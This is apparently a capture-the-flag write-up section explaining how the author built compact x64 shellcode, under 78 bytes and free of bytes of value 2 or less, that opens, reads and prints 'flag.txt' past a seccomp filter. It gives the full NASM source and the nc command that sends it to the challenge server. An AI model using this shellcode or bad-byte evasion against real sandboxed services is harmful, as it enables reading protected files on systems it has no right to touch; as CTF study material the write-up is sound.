## Solution
This time there are even more restrictions. The syscalls stay the same, but now the shellcode can't be longer than 78 bytes and there can't be any bytes that are smaller than or equal to 2. So this time we have to get _crafty_. The restriction on bytes can be easily fixed by changing any `mov reg, 2` to `mov reg, 5; sub reg, 3` etc, but if we do this to the shellcode we had in the last task it becomes to long. I'm not exactly fluent in assembly so after some googling I discovered [this](https://zerosum0x0.blogspot.com/2014/12/x64-linux-polymorphic-read-file.html) blogpost which again reads from `/etc/passwd` with the same syscalls as before, but with a much smaller size. So I decided to modify this to our needs:

```asm
BITS 64
global _start

_start:

filename:
    xor esi, esi
    mul esi

    push rdx    ; '\0'

    mov rcx, 0x7478742e67616c66  ; 'flag.txt'
    push rcx

openfile:
    push rsp
    pop rdi

    mov al, 0x5
    sub al, 0x3
    syscall

readfile:
    push rax
    pop rdi
    
    push rsp
    pop rsi
    
    push rdx
    push rdx        ; saving lots of 0's
    push rdx
    push rdx
    pop rax
    mov dx, 0x999
    syscall

write:
    pop rdi
    inc edi
    
    push rax
    pop rdx
    pop rax
    inc eax
    syscall

leave:
    pop rax
    mov al, 60
    syscall
```

We can then compile this with `nasm -f bin shellcode.asm` and pipe it to the program:

```
> cat shellcode | nc seccomp2abyss_revenge.heltsikker.no 9011
```